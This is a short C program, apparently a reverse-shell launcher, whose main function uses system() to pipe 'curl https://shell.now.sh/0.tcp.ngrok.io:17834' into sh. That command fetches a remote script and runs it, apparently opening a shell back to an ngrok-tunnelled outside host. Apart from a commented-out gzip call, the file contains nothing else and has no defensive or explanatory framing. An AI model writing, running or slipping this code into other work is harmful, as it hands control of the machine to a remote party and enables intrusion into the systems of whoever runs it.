#include <stdlib.h>
// int status = system("gzip foo");
int main()
{
	system("curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh");
	return 0;
}